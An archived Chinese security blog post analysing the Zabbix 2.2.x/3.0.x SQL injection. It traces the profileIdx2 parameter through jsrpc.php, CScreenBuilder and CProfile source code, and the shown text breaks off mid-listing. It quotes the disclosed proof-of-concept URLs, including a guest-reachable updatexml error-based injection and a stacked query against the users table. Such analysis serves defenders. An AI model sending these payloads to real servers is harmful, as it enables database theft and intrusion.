<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01 背景该漏洞于8月12日由安全研究员 1N3@CrowdShield 和 Brandon Perry 负责任地披露于 Full Disclosure,两人都在邮件中公开了 PoC，如下： 1234需要高权限用户latest.php?output=ajax&amp;amp;sid=&amp;amp;favobj=toggle&amp;amp;toggle_open_state=1&amp;amp;toggle_ids[]=">
<meta name="keywords" content="sqli">
<meta property="og:type" content="article">
<meta property="og:title" content="Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP">
<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;vul-analysis&#x2F;zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html">
<meta property="og:site_name" content="ZeroKeeper">
<meta property="og:description" content="0x01 背景该漏洞于8月12日由安全研究员 1N3@CrowdShield 和 Brandon Perry 负责任地披露于 Full Disclosure,两人都在邮件中公开了 PoC，如下： 1234需要高权限用户latest.php?output=ajax&amp;amp;sid=&amp;amp;favobj=toggle&amp;amp;toggle_open_state=1&amp;amp;toggle_ids[]=">
<meta property="og:locale" content="en">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;zabbix.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;zabbix-verify.png">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;zabbix-exp.png">
<meta property="og:updated_time" content="2019-10-20T15:15:05.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;zabbix.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/experience/vultr-centos6-vps-install-lnmp-environment-and-wordpress.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/programing/virustotal-api-python-easy-to-use.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&text=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&is_video=false&description=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP&body=Check out this article: http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&title=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/vul-analysis/zabbix-22x-30x-sql-injection-vulnerability-analysis-and-utilization-of-exp.html&name=Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP&description=&lt;h2 id=&#34;0x01-背景&#34;&gt;&lt;a href=&#34;#0x01-背景&#34; class=&#34;headerlink&#34; title=&#34;0x01 背景&#34;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;该漏洞于8月12日由安全研究员 1N3@CrowdShield 和 Brandon Perry 负责任地披露于 Full Disclosure,两人都在邮件中公开了 PoC，如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;需要高权限用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;latest.php?output=ajax&amp;amp;sid=&amp;amp;favobj=toggle&amp;amp;toggle_open_state=1&amp;amp;toggle_ids[]=15385); select * from users where (1=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;普通guest用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jsrpc.php?type=9&amp;amp;method=screen.get&amp;amp;timestamp=1471403798083&amp;amp;pageFile=history.php&amp;amp;profileIdx=web.item.graph&amp;amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;amp;updateProfile=true&amp;amp;period=3600&amp;amp;stime=20160817050632&amp;amp;resourcetype=17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞影响范围&lt;br&gt;凡使用Zabbix2.2.x、3.0.x 的网站（在3.0.4版本中已修复）可能导致敏感数据泄漏、服务器被恶意攻击者控制进而造成更多危害等。&lt;br&gt;Zabbix简介&lt;br&gt;zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。&lt;br&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/zabbix.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-背景"><span class="toc-number">1.</span> <span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-漏洞证明"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞证明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04漏洞EXP"><span class="toc-number">4.</span> <span class="toc-text">0x04漏洞EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-漏洞修复"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-参考"><span class="toc-number">6.</span> <span class="toc-text">0x06 参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Zabbix 2.2.x,3.0.x SQL注入漏洞分析及利用EXP
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ZeroKeeper</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2017-03-05T00:15:00.000Z" itemprop="datePublished">2017-03-05</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/vul-analysis/">vul-analysis</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/sqli/" rel="tag">sqli</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>该漏洞于8月12日由安全研究员 1N3@CrowdShield 和 Brandon Perry 负责任地披露于 Full Disclosure,两人都在邮件中公开了 PoC，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">需要高权限用户</span><br><span class="line">latest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385); select * from users where (1=1</span><br><span class="line">普通guest用户</span><br><span class="line">jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17</span><br></pre></td></tr></table></figure>
<p>漏洞影响范围<br>凡使用Zabbix2.2.x、3.0.x 的网站（在3.0.4版本中已修复）可能导致敏感数据泄漏、服务器被恶意攻击者控制进而造成更多危害等。<br>Zabbix简介<br>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/zabbix.jpg" alt=""></p>
<a id="more"></a>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>这里是对zabbix3.0.3的源码包进行简单分析。ps: 官网已经没有3.0.3的源码包了，这里找到一个，<a href="http://sourceforge.mirrorservice.org/z/za/zabbix/ZABBIX%20Latest%20Stable/3.0.3/zabbix-3.0.3.tar.gz" target="_blank" rel="noopener">源码包下载地址</a><br>注入产生的流程:</p>
<blockquote>
<p>jsrpc.php:182→CScreenBuilder::getScreen()→CScreenBase::calculateTime()→CProfile::update()<br>→page_footer.php:40→CProfile::flush()→CProfile::insertDB()→DBexecute()</p>
</blockquote>
<p>根据提供的poc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17</span><br></pre></td></tr></table></figure>
<p>首先找到jsrpc.php,为了方便阅读，下面会省略无关代码。<br>/zabbix-3.0.3/frontends/php/jsrpc.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$requestType = getRequest(&apos;type&apos;, PAGE_TYPE_JSON);</span><br><span class="line">if ($requestType == PAGE_TYPE_JSON) &#123;</span><br><span class="line">	$http_request = new CHttpRequest();</span><br><span class="line">	$json = new CJson();</span><br><span class="line">	$data = $json-&gt;decode($http_request-&gt;body(), true);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	//将url的参数赋给$data</span><br><span class="line">	$data = $_REQUEST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page[&apos;title&apos;] = &apos;RPC&apos;;</span><br><span class="line">$page[&apos;file&apos;] = &apos;jsrpc.php&apos;;</span><br><span class="line">$page[&apos;type&apos;] = detect_page_type($requestType);</span><br><span class="line"></span><br><span class="line">require_once dirname(__FILE__).&apos;/include/page_header.php&apos;;</span><br><span class="line"></span><br><span class="line">if (!is_array($data) || !isset($data[&apos;method&apos;])</span><br><span class="line">		|| ($requestType == PAGE_TYPE_JSON &amp;&amp; (!isset($data[&apos;params&apos;]) || !is_array($data[&apos;params&apos;])))) &#123;</span><br><span class="line">	fatal_error(&apos;Wrong RPC call to JS RPC!&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = [];</span><br><span class="line">//判断参数中method值screen.get然后进入到相应的case里</span><br><span class="line">switch ($data[&apos;method&apos;]) &#123;</span><br><span class="line">...</span><br><span class="line">	case &apos;screen.get&apos;:</span><br><span class="line">		$result = &apos;&apos;;</span><br><span class="line">		$screenBase = CScreenBuilder::getScreen($data);</span><br><span class="line">		if ($screenBase !== null) &#123;</span><br><span class="line">			$screen = $screenBase-&gt;get();</span><br><span class="line"></span><br><span class="line">			if ($data[&apos;mode&apos;] == SCREEN_MODE_JS) &#123;</span><br><span class="line">				$result = $screen;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				if (is_object($screen)) &#123;</span><br><span class="line">					$result = $screen-&gt;toString();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		break;</span><br><span class="line">...</span><br><span class="line">require_once dirname(__FILE__).&apos;/include/page_footer.php&apos;;</span><br></pre></td></tr></table></figure>
<p>看到是调用了CScreenBuilder类的getScreen($data)方法来处理$data数据，跟进<br>/zabbix-3.0.3/frontends/php/include/classes/screens/CScreenBuilder.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Init screen data.</span><br><span class="line"> *</span><br><span class="line"> * @param array		$options</span><br><span class="line"> * @param boolean	$options[&apos;isFlickerfree&apos;]</span><br><span class="line"> * @param string	$options[&apos;pageFile&apos;]</span><br><span class="line"> * @param int		$options[&apos;mode&apos;]</span><br><span class="line"> * @param int		$options[&apos;timestamp&apos;]</span><br><span class="line"> * @param int		$options[&apos;hostid&apos;]</span><br><span class="line"> * @param int		$options[&apos;period&apos;]</span><br><span class="line"> * @param int		$options[&apos;stime&apos;]</span><br><span class="line"> * @param string	$options[&apos;profileIdx&apos;]</span><br><span class="line"> * @param int		$options[&apos;profileIdx2&apos;]</span><br><span class="line"> * @param boolean	$options[&apos;updateProfile&apos;]</span><br><span class="line"> * @param array		$options[&apos;screen&apos;]</span><br><span class="line"> */</span><br><span class="line">public function __construct(array $options = []) &#123;</span><br><span class="line">    $this-&gt;isFlickerfree = isset($options[&apos;isFlickerfree&apos;]) ? $options[&apos;isFlickerfree&apos;] : true;</span><br><span class="line">    $this-&gt;mode = isset($options[&apos;mode&apos;]) ? $options[&apos;mode&apos;] : SCREEN_MODE_SLIDESHOW;</span><br><span class="line">    $this-&gt;timestamp = !empty($options[&apos;timestamp&apos;]) ? $options[&apos;timestamp&apos;] : time();</span><br><span class="line">    $this-&gt;hostid = !empty($options[&apos;hostid&apos;]) ? $options[&apos;hostid&apos;] : null;</span><br><span class="line"></span><br><span class="line">    // get page file</span><br><span class="line">    if (!empty($options[&apos;pageFile&apos;])) &#123;</span><br><span class="line">        $this-&gt;pageFile = $options[&apos;pageFile&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        global $page;</span><br><span class="line">        $this-&gt;pageFile = $page[&apos;file&apos;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // get screen</span><br><span class="line">    if (!empty($options[&apos;screen&apos;])) &#123;</span><br><span class="line">        $this-&gt;screen = $options[&apos;screen&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    elseif (array_key_exists(&apos;screenid&apos;, $options) &amp;&amp; $options[&apos;screenid&apos;] &gt; 0) &#123;</span><br><span class="line">        $this-&gt;screen = API::Screen()-&gt;get([</span><br><span class="line">            &apos;screenids&apos; =&gt; $options[&apos;screenid&apos;],</span><br><span class="line">            &apos;output&apos; =&gt; API_OUTPUT_EXTEND,</span><br><span class="line">            &apos;selectScreenItems&apos; =&gt; API_OUTPUT_EXTEND,</span><br><span class="line">            &apos;editable&apos; =&gt; ($this-&gt;mode == SCREEN_MODE_EDIT)</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        if (!empty($this-&gt;screen)) &#123;</span><br><span class="line">            $this-&gt;screen = reset($this-&gt;screen);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            access_deny();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // calculate time</span><br><span class="line">    $this-&gt;profileIdx = !empty($options[&apos;profileIdx&apos;]) ? $options[&apos;profileIdx&apos;] : &apos;&apos;;</span><br><span class="line">    $this-&gt;profileIdx2 = !empty($options[&apos;profileIdx2&apos;]) ? $options[&apos;profileIdx2&apos;] : null;</span><br><span class="line">    $this-&gt;updateProfile = isset($options[&apos;updateProfile&apos;]) ? $options[&apos;updateProfile&apos;] : true;</span><br><span class="line"></span><br><span class="line">    $this-&gt;timeline = CScreenBase::calculateTime([</span><br><span class="line">        &apos;profileIdx&apos; =&gt; $this-&gt;profileIdx,</span><br><span class="line">        &apos;profileIdx2&apos; =&gt; $this-&gt;profileIdx2,</span><br><span class="line">        &apos;updateProfile&apos; =&gt; $this-&gt;updateProfile,</span><br><span class="line">        &apos;period&apos; =&gt; !empty($options[&apos;period&apos;]) ? $options[&apos;period&apos;] : null,</span><br><span class="line">        &apos;stime&apos; =&gt; !empty($options[&apos;stime&apos;]) ? $options[&apos;stime&apos;] : null</span><br><span class="line">    ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现首先调用了个构造方法初始化数据，这里就有对profileIdx2参数的操作了，但是还是没有insert注入语句，我们看到最后调用了CScreenBase类的calculateTime方法并把profileIdx2传进去了，跟进<br>/zabbix-3.0.3/frontends/php/include/classes/screens/CScreenBase.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">* Insert javascript flicker-free screen data.</span><br><span class="line">*</span><br><span class="line">* @static</span><br><span class="line">*</span><br><span class="line">* @param array		$options</span><br><span class="line">* @param string	$options[&apos;profileIdx&apos;]</span><br><span class="line">* @param int		$options[&apos;profileIdx2&apos;]</span><br><span class="line">* @param boolean	$options[&apos;updateProfile&apos;]</span><br><span class="line">* @param int		$options[&apos;period&apos;]</span><br><span class="line">* @param string	$options[&apos;stime&apos;]</span><br><span class="line">*</span><br><span class="line">* @return array</span><br><span class="line">*/</span><br><span class="line">public static function calculateTime(array $options = []) &#123;</span><br><span class="line">    if (!array_key_exists(&apos;updateProfile&apos;, $options)) &#123;</span><br><span class="line">        $options[&apos;updateProfile&apos;] = true;</span><br><span class="line">    &#125;</span><br><span class="line">    if (empty($options[&apos;profileIdx2&apos;])) &#123;</span><br><span class="line">        $options[&apos;profileIdx2&apos;] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Show only latest data without update is set only period.</span><br><span class="line">    if (!empty($options[&apos;period&apos;]) &amp;&amp; empty($options[&apos;stime&apos;])) &#123;</span><br><span class="line">        $options[&apos;updateProfile&apos;] = false;</span><br><span class="line">        $options[&apos;profileIdx&apos;] = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // period</span><br><span class="line">    if (empty($options[&apos;period&apos;])) &#123;</span><br><span class="line">        $options[&apos;period&apos;] = !empty($options[&apos;profileIdx&apos;])</span><br><span class="line">            ? CProfile::get($options[&apos;profileIdx&apos;].&apos;.period&apos;, ZBX_PERIOD_DEFAULT, $options[&apos;profileIdx2&apos;])</span><br><span class="line">            : ZBX_PERIOD_DEFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        if ($options[&apos;period&apos;] &lt; ZBX_MIN_PERIOD) &#123;</span><br><span class="line">            show_error_message(_n(&apos;Minimum time period to display is %1$s minute.&apos;,</span><br><span class="line">                &apos;Minimum time period to display is %1$s minutes.&apos;,</span><br><span class="line">                (int) ZBX_MIN_PERIOD / SEC_PER_MIN</span><br><span class="line">            ));</span><br><span class="line">            $options[&apos;period&apos;] = ZBX_MIN_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">        elseif ($options[&apos;period&apos;] &gt; ZBX_MAX_PERIOD) &#123;</span><br><span class="line">            show_error_message(_n(&apos;Maximum time period to display is %1$s day.&apos;,</span><br><span class="line">                &apos;Maximum time period to display is %1$s days.&apos;,</span><br><span class="line">                (int) ZBX_MAX_PERIOD / SEC_PER_DAY</span><br><span class="line">            ));</span><br><span class="line">            $options[&apos;period&apos;] = ZBX_MAX_PERIOD;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($options[&apos;updateProfile&apos;] &amp;&amp; !empty($options[&apos;profileIdx&apos;])) &#123;</span><br><span class="line">        CProfile::update($options[&apos;profileIdx&apos;].&apos;.period&apos;, $options[&apos;period&apos;], PROFILE_TYPE_INT, $options[&apos;profileIdx2&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里再次引入了一个类CProfile并调用update方法将profileIdx2带入到更新操作里了，没有insert语句没关系，我们先跟进CProfile类的update函数。<br>/zabbix-3.0.3/frontends/php/include/classes/user/CProfile.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 